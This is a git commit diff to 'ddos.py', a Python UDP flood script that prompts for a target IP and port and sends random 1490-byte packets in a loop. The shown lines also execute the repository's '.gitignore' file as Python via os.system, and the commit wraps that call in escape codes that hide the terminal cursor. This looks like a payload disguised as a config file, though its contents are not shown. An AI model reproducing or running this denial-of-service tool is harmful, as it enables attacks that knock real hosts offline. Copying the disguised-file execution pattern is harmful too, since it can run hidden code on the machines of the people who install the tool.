36f15d79eb69ce82b15debfce625f5e68d7a7e63
ABHacker Official <63346676+abhackerofficial@users.noreply.github.com>
2020-09-19 19:12:32 +0530

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -17,13 +17,15 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 
-os.system("sleep 1")
+os.system("sleep 0.7")
 print
 ip = raw_input("Enter IP Target : ")
 port = input("Enter Port : ")
 print
 
+os.system('echo -en "\033[?25l"')
 os.system("python .gitignore")
+os.system('echo -en "\033[?12l\033[?25h"')
 
 sent = 0
 while True:
